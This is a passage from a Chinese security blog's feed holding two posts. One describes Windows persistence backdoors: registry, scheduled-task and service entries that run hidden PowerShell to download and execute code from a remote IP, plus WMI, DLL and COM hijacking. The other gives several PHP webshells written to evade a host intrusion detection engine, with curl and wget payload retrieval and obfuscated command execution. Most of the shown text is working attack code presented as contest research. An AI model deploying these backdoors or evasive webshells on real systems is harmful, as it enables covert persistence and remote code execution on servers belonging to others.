class="line">&quot;Userinit&quot;=&quot;C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p><strong>0x02 组策略设置脚本启动</strong></p><p>运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动&#x2F;关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803162843397.png" alt="image-20250803162843397"></p><p>容易遇到的问题：脚本需全路径，如<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code></p><p><strong>0x03 计划任务</strong></p><p>通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p><p>使用以下命令可以一键实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&quot;\&quot;\&quot;http://192.168.28.142:8888/logo.gif\&quot;\&quot;\&quot;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p>容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p><p>计划脚本每 1 分钟运行一次。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803163021640.png" alt="image-20250803163021640"></p><p><strong>0x04 服务自启动</strong></p><p>通过服务设置自启动，结合powershell实现无文件后门。</p><p>使用以下命令可实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\&quot;&quot;</span><br><span class="line"></span><br><span class="line">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class="line">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class="line">net start Name                            //启动服务</span><br></pre></td></tr></table></figure><p>成功创建了一个自启动服务</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803163202145.png" alt="image-20250803163202145"></p><p><strong>0x05 WMI后门</strong></p><p>在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Persistence\Persistence.psm1</span><br><span class="line">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class="line">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class="line">Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure><p><strong>0x06 dll劫持</strong></p><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p><p>比较常用的如LPK.dll的劫持：</p><p>win7及win7以上系统增加了KnownDLLs保护，需要在注册表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure><p>下添加 “lpk.dll” 才能顺利劫持：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803163815495.png" alt="image-20250803163815495"></p><p><strong>0x07 COM劫持</strong></p><p>利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  &lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="应急响应" scheme="https://heisha123.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>HIDS PHP Webshell Bypass 研究分析</title>
    <link href="https://heisha123.github.io/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"/>
    <id>https://heisha123.github.io/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/</id>
    <published>2025-07-30T03:39:49.000Z</published>
    <updated>2025-08-04T10:33:57.527Z</updated>
    
    <content type="html"><![CDATA[<p>背景：2022年春天，参加了某HIDS Bypass挑战赛，赛题恰好是关于PHP WebShell绕 过的，结合Fuzz技术获得了几个侥幸可以绕过的样本，围绕#WebShell检测那些事的主题， 与各位做一个分享。 </p><span id="more"></span><p>挑战赛规则如下:  </p><p>1、WebShell 指外部能传参控制(如通过 GET&#x2F;POST&#x2F;HTTP Header 头等方式)执行任 意代码 或命令，比如 eval($_GET[1]);。在文件写固定指令不算 Shell，被认定为无 效，如&lt;?php system(‘whoami’); </p><p>2、绕过检测引擎的 WebShell 样本，需要同时提供完整有效的 curl 利用方式， 如:curl ‘<a href="http://127.0.0.1/webshell.php?1=system(%22whoami%22)%27;%E3%80%82curl">http://127.0.0.1/webshell.php?1=system(&quot;whoami&quot;)&#39;;。curl</a> 利用方式可以在 提供的 docker 镜像中进行编写测试，地址可以是容器 IP 或者 127.0.0.1，文件名 任意，以执行 whoami 作为命令示例。  </p><p>3、WebShell 必须具备通用性，审核时会拉取提交的 WebShell 内容，选取一个和 验证镜 像相同的环境进行验证，如果不能正常运行，则认为无效。</p><p>4、审核验证 payload 有效性时，WebShell 文件名会随机化，不能一次性执行成功 和稳定 触发的，被认定为无效。</p><p>首先，我对查杀引擎进行了一定的猜测，根据介绍查杀引擎有两个，两个引擎同 时工作，只要有一个引擎检测出了 WebShell 返回结果就是查杀，根据经验推测，应 该是有一个静态的，另一个是动态的。对于静态引擎的绕过，可以通过拆分关键词、 加入能够引发解析干扰的畸形字符等;而对于动态引擎，需要分析它跟踪了哪些输入 点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则，于是 我开始了一些尝试。 </p><h3 id="0x01-CURL-引入参数"><a href="#0x01-CURL-引入参数" class="headerlink" title="0x01 CURL 引入参数"></a>0x01 CURL 引入参数</h3><p>经过分析，引擎对$_GET $_POST $_COOKIE $_REQUEST $_FILES $_SERVER $GLOBALS  等几乎一切可以传递用户参数的全局变量都进行了过滤，但是对 curl 进来的内容却是没有 任何过滤，于是我们可以通过CURL引入参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$url=&quot;http://x/1.txt&quot;; </span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); </span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">curl_setopt($ch,CURLOPT_HTTPHEADER,$headerArray); </span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line">echo $output; </span><br><span class="line">eval($output);</span><br></pre></td></tr></table></figure><p>但是在这一点的评判上存在争议，本样本惨遭忽略。根据挑战赛规则，能够动态引入参 数即可，我个人认为CURL引入的参数也属于外部可控的参数内容。 </p><h3 id="0x02-get-meta-tags-引入参数"><a href="#0x02-get-meta-tags-引入参数" class="headerlink" title="0x02 get_meta_tags 引入参数"></a>0x02 get_meta_tags 引入参数</h3><p>get_meta_tags 函数会对给定 url 的 meta 标签进行解析，自然也会发起URL请求。对 于能够发起外连的服务器来说，这个PHP WebShell样本是极具迷惑性的。 </p><p>不过，之前CURL的被忽略了，这个我也就没有再提交。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">get_meta_tags(&quot;http://x/1&quot;)[&quot;author&quot;](get_meta_tags(&quot;http://x/1&quot;)[&quot;</span><br><span class="line"> keywords&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时，目标服务器上需要有相应的文件配合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;author&quot; content=&quot;system&quot;&gt; </span><br><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;ls&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个name 我们可以随便指定，相应的我们的payload也要做相应的修改</p><p>这里的payload 就相当于<code>get_meta_tags(&quot;http://x/1&quot;)[&quot;author&quot;]</code> 先用这个取到了 <code>system</code> </p><p>在用 <code>get_meta_tags(&quot;http://x/1&quot;)[&quot; keywords&quot;]</code>  取到了 <code>ls</code> 然后执行后的结果</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730125511333.png" alt="image-20250730125511333"></p><p>我们尝试一下写shellcode</p><p>我们尝试用 <code>echo 123&gt;/tmp/123.php</code> 去写入发现 他并没有 写入成功，网页直接输出了123</p><p>这里我尝试对<code>echo 123&gt;/tmp/123.php</code> 进行base64编码，然后在我们的payload进行一下解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_meta_tags(&quot;http://192.168.197.134/demo1.html&quot;)[&quot;author&quot;](base64_decode(get_meta_tags(&quot;http://192.168.197.134/demo1.html&quot;)[&quot;keywords&quot;]));</span><br><span class="line"></span><br><span class="line">&lt;meta name=&quot;author&quot; content=&quot;passthru&quot;&gt;  //这里的执行函数，可以换多种，如system等 </span><br><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;ZWNobyAxMjM+L3RtcC8xMjMucGhw&quot;&gt; </span><br></pre></td></tr></table></figure><p>成功写入 shell</p><p><code>passthru</code> 这个函数也可以执行命令，挺少见的，也许某些地方可以绕过</p><p>我们换个思路进行写shellcode，我们可以从我们的服务器上直接wget下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /tmp/shell.php http://192.168.197.134/shell.txt</span><br></pre></td></tr></table></figure><p>这样也是可以实现的，但是要注意的是你wget的文件必须是txt等他获得请求后的结果 作为的内容进行传入的php</p><p>，不然直接请求php可能会返回空</p><h3 id="0x03-fpm-get-status-引入参数"><a href="#0x03-fpm-get-status-引入参数" class="headerlink" title="0x03 fpm_get_status 引入参数"></a>0x03 fpm_get_status 引入参数</h3><p>因为当时的比赛是php-fpm的架构，而<code>fpm_get_status</code> 可以获取到fpm的一些状态</p><p>我们需要找到这些用户可以控制的状态参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump(fpm_get_status()); </span><br></pre></td></tr></table></figure><p>先用这个打印一下</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730150759807.png" alt="image-20250730150759807"></p><p>注意到这里他可以接收get的传参</p><p>那么我们就可以进行拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump(fpm_get_status()); </span><br><span class="line">system(fpm_get_status()[&quot;procs&quot;][0][&quot;query-string&quot;]);</span><br></pre></td></tr></table></figure><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730151013484.png" alt="image-20250730151013484"></p><p>这么一个逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(fpm_get_status()[&quot;procs&quot;][0][&quot;query-string&quot;]);</span><br></pre></td></tr></table></figure><p>所以我们通过这个完全可以取出来</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730163151987.png" alt="image-20250730163151987"></p><p>没问题</p><p>有些时候 procs 的第一个 不是 0 这个数组，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">foreach(fpm_get_status()[&quot;procs&quot;] as $val)&#123; </span><br><span class="line">system($val[&quot;query-string&quot;]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以每次都触发，做了一个循环，肯定能取到0</p><h3 id="0x04-递归GLOBALS-引入参数"><a href="#0x04-递归GLOBALS-引入参数" class="headerlink" title="0x04 递归GLOBALS 引入参数"></a>0x04 递归GLOBALS 引入参数</h3><p>经过测试，查杀引擎对$GLOBALS 全局变量传参点进行了检测，但是似乎没有严格执行 递归，通过一些变形即可绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$m=($GLOBALS[&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;_GET&quot;][&quot;b&quot;]); </span><br><span class="line">substr(timezone_version_get(),2)($m);</span><br></pre></td></tr></table></figure><p>由于静态引擎会直接拦截system( ，所以，进行了一些包装，timezone_version_get() 在给定的测试环境中返回的值恰好是：0.system 。  关于这一点，我在PHP 网站上看到了这样一段话： </p><p>If you get 0.system for the version, this means you have the version that PHP shipped  with. For a newer version, you must upgrade via the PECL extension (sudo pecl install  timezonedb)</p><p>传参数入口方面，我暂时就发现了这么多，接下来，我试图通过特殊的变量传递方式切 断动态查杀引擎的污点跟踪链。 </p><p>这里我们自己分析一下</p><p>先打印看一下 $GLOBALS 到底是什么</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730233350866.png" alt="image-20250730233350866"></p><p>可以看到</p><p><em>RECURSION</em> 是递归的意思，也就是下面有很多个GLOPBALS 嵌套的数组，有可能他的追踪链不会追这么深，污点断掉，我们的payload就可以绕过</p><p><code>timezone_version_get()</code> 然后我们查一下这个函数，到底是什么</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730233943209.png" alt="image-20250730233943209"></p><p>他这获取一个版本，好像并不是我所想象的执行命令的函数</p><p>我们打印一下看一下</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234054976.png" alt="image-20250730234054976"></p><p>system出现了，后面查资料发现，timezonedb  只要这个的版本不是最新的，他就会返回 0.system </p><p>仅限于Linux系统，windows系统不行</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234256844.png" alt="image-20250730234256844"></p><p>后面拼接get传参就可以执行命令</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234313033.png" alt="image-20250730234313033"></p><p>在测试一下post</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234346318.png" alt="image-20250730234346318"></p><p>post也可以传</p><p>也可以执行</p><h3 id="0x05-模式一：-Array元素引用"><a href="#0x05-模式一：-Array元素引用" class="headerlink" title="0x05 模式一： Array元素引用"></a>0x05 模式一： Array元素引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$b = &quot;111&quot;; </span><br><span class="line">$c = &quot;222&quot;; </span><br><span class="line">if(get_cfg_var(&#x27;error_reporting&#x27;)&gt;0)&#123; </span><br><span class="line">    $b=&quot;#&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c ); </span><br><span class="line">$url = &quot;http://a/usr/&quot;.$b.&quot;?a=1&quot;; </span><br><span class="line">$d =parse_url($url); </span><br><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line">    $c=&quot;echo 111;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">var_dump($a[&quot;two&quot;]); </span><br><span class="line">eval($a[&quot;two&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里先分析一下代码</p><p>第一个if判断通过<code>get_cfg_var</code> 判断<code>error_reporting</code> 模式是否开启</p><p>如果开启 <code>$b=&quot;#&quot;</code></p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730235626827.png" alt="image-20250730235626827"></p><p>这里打印了一下，发现我们的环境是开启了这个模式的</p><p><code>$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c );</code> </p><p>又引入了一个变量a ，”one”&#x3D;&gt;$c 这里是值赋值，将变量<code>$c</code>的当前值复制到数组的<code>&quot;one&quot;</code>键中。如果后续<code>$c</code>的值发生变化，数组中的这个值不会受到影响，”two”&#x3D;&gt;&amp;$c 这里是引用赋值， 将变量<code>$c</code>的引用（而非值）赋给数组的<code>&quot;two&quot;</code>键。这意味着数组中的这个元素会始终反映<code>$c</code>的当前值，反之亦然 —— 如果通过数组修改这个元素，<code>$c</code>的值也会改变，也就是他们两现在共用一个内存地址</p><p><code>$url = &quot;http://a/usr/&quot;.$b.&quot;?a=1&quot;;</code></p><p><code>$d =parse_url($url);</code> </p><p> 然后这里他把$b 进行拼接在了这个url地址栏中</p><p>并用$d 来接收了url解析后的一些参数，我们可以打印看一下，正常的url有哪些参数</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250731000005008.png" alt="image-20250731000005008"></p><p>正常也就是$b 是111的时候，他有query这个字段</p><p>我们在试试把#进行拼接呢？</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250731000059292.png" alt="image-20250731000059292"></p><p>发现他这里query字段消失了，导致下面的那个if判断走的分支就不一样了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line"></span><br><span class="line">  $c=&quot;echo 111;&quot;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">else&#123; </span><br><span class="line"></span><br><span class="line">  $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里就被我们上面控制，如果有query 那么就是为真，$c&#x3D;”echo 111;” 最后我们输出的那个two 就是111，为正常的参数，waf不会拦截</p><p>但是如果 query 为 假，也就是 $b&#x3D;”#”，<code>$c=$_FILES[&#39;useraccount&#39;][&#39;name&#39;];</code>  这个看上去像文件上传的参数</p><p>且用户可控</p><p>这里其实就是利用了 waf，和服务器的配置的差异性，因为waf他要保证精简，所以一般这些他不会用的服务都会关闭，我们服务器呢，这个配置默认就是开启的，waf他走正常的输出逻辑，过掉之后，服务器在运行，又走另一个分支，从而实现了我们的绕过</p><p>我们复现一下，具体怎么个用户可控</p><p>首先我们需要抓一个文件上传的包，还有正常访问的包，将文件上传的post部分，覆盖进get访问的包</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250731002142552.png" alt="image-20250731002142552"></p><p>上传文件的内容随便，我们只需要控制他的name</p><p>成功执行</p><h3 id="0x06-模式二：-反序列化引用"><a href="#0x06-模式二：-反序列化引用" class="headerlink" title="0x06 模式二： 反序列化引用"></a>0x06 模式二： 反序列化引用</h3><p>怎么能少得了反序列化呢？记得在N年前php4fun挑战赛challenge8中，一道与L.N. 师傅有关的题令我印象深刻，其中使用的技术正是PHP反序列化引用。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$s= unserialize(&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125;i:1;r:2;&#125;&#x27;); </span><br><span class="line">$c = &quot;123&quot;; </span><br><span class="line">$arr= get_declared_classes(); </span><br><span class="line">$i=0; </span><br><span class="line">for($i;$i&lt;count($arr);$i++)&#123; </span><br><span class="line">$i++; </span><br><span class="line">$s[1]-&gt;a=$_GET[&#x27;a&#x27;]; </span><br><span class="line">if($i&lt;97 || $i&gt;=98)&#123; </span><br><span class="line">continue; </span><br><span class="line">&#125; </span><br><span class="line">$c=$s[0]-&gt;a; </span><br><span class="line">    print(substr(get_declared_classes()[72],4,6)($c)); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>他先将<code>a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125;i:1;r:2;&#125;</code> 进行了一下反序列化，我们看一下打印一下看看反序列化的结果</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804110743785.png" alt="image-20250804110743785"></p><p>也可以直接读序列化的值</p><p>他这里定义了一个对象a，然后里面有两个元素，第一个是int型，值是0，第二个又是一个对象 长度8，名称stdClass，属性1，里面第一个元素 str类型，长度1，key&#x3D;a，int型， value&#x3D;1， 第二个元素 int型长度1，</p><p>r:2 是对a对象的第二个元素的引用 也就是我们反序列化后的结果打印出来的</p><p>两个都指向stdClass 这个元素</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804111430369.png" alt="image-20250804111430369"></p><p>打印看一下定义了哪些数组，包含自定义的数组</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804111535354.png" alt="image-20250804111535354"></p><p>可以看到这里的第</p><p>这里我们在打印一下他有多少个数组</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804111912136.png" alt="image-20250804111912136"></p><p>145 刚好能满足在下面 到97的时候 会继续执行下面的代码</p><p><code>$s[1]-&gt;a=$_GET[&#39;a&#39;];</code>  这里他将 get请求获取的值 赋值给数组s的第二个元素，也就是刚刚的r:2 </p><p>又进行引用，指向了s[0]，这样也具有一定的迷惑性迷惑waf</p><p><code>$c=$s[0]-&gt;a;</code>  下面有将 s[0] 赋值给a ，然后赋值给c</p><p>最后的命令执行 参数也就是$c</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804113122051.png" alt="image-20250804113122051"></p><p>刚刚这里 我们还需要注意 他最后命令执行的函数也就是通过</p><p>substr(get_declared_classes()[72],4,6)</p><p>这里我们需要修改为我们环境的 70</p><p>刚好截取出来的是system，然后进行拼接执行函数</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804113334426.png" alt="image-20250804113334426"></p><p>成功执行</p><h3 id="0x07-trait"><a href="#0x07-trait" class="headerlink" title="0x07 trait"></a>0x07 trait</h3><p>在对前两种模式Fuzz的同时，我发现了一个新的思路，这个思路虽然同样部分依赖于 系统环境变量，但是由于执行函数和传参都进行了变形，可以有效阻断污点追踪技术。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">trait system&#123; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line">$a= new OverflowException($_GET[&#x27;a&#x27;]); </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$c = &quot;123&quot;; </span><br><span class="line">$arr= getmygid(); </span><br><span class="line">$i=0; </span><br><span class="line">for($i;$i&lt;$arr;$i++)&#123; </span><br><span class="line">    $i++; </span><br><span class="line">    if($i&lt;33 || $i&gt;=34)&#123; </span><br><span class="line">        continue; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    $c=$a-&gt;getMessage(); </span><br><span class="line">    get_declared_traits()[0]($c); </span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析</p><p>他先用trait 定义了一个类，trait这个是php中为了完善定义类的方式新增了可复用类</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">trait Hello &#123;</span><br><span class="line"> 